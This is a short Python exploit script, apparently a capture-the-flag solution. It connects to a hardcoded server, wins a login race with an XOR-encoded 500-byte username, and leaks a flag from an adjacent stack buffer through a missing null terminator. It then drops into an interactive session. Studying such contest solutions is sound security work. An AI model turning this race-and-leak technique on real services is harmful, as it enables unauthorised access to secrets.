#!/usr/bin/python
import socket
import struct
import sys
import telnetlib
import time

def readuntil(f, delim='> '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def xor(s):
    return ''.join(chr(ord(x) ^ 0x20) for x in s)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.148.54.10', 9447))
f = s.makefile('rw', bufsize=0)

readuntil(f)

f.write('1\nguest\nguest\n')
readuntil(f)

f.write('1\n')

# Same race as in europe01, except this time we replace the username
# with a string of length 500. We use the "see the message"
# functionality, which copies the loggedin_user buffer (xoring it with
# 0x20) into a stack buffer immediately before a buffer which contains
# the second flag and prints a message containing the buffer. The
# username is not null terminated, so we use this to get it to print out
# the second flag.
payload = 'A' * 500
payload += '\x20'

f.write(xor(payload) + '\n\n')
readuntil(f)

time.sleep(1)
f.write('3\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
